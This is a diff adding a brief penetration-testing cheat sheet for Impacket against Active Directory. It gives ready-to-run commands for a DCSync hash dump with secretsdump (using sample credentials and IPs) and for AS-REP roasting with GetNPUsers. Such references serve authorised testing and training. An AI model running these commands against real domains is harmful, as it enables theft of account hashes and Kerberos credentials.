@@ -1,0 +1,19 @@
+---
+syntax: bash
+tags: [ impacket, ad, kerberos ]
+---
+
+# Notes: 
+# - ensure the FQDN of the primary domain controller is set in /etc/hosts
+# - use "-k -no-pass" to user kerberos credentials instead of an NTLM or password
+# - use -hashes :<NTLM> to use an NTLM hash
+
+# DCSYNC
+# To DCSYNC using credentials of a user with replication privileges within the domain:
+impacket-secretsdump tricky.com/will:Password1@172.16.122.150 -dc-ip 172.16.122.15 -history -outputfile dcsync_dump.txt
+
+# ASREP-Roasting
+# To ASREP-Roast targeting a known single user:
+impacket-GetNPUsers complyedge.com/Administrator -no-pass -request
+# To ASREP-Roast targeting list of users:
+impacket-GetNPUsers complyedge.com/ -usersfile users.txt -no-pass -request
